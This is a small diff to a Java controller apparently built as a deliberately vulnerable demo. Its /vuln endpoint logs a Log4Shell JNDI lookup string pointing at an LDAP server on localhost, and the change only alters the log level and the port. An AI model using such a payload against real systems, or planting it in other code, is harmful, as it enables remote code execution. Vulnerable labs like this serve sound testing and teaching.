@@ -12,6 +12,6 @@ public class VulnController {
 
     @GetMapping("/vuln")
     void index() {
-        log.info("${jndi:ldap://127.0.0.1:2000/a}");
+        log.error("${jndi:ldap://127.0.0.1:5000/a}");
     }
 }
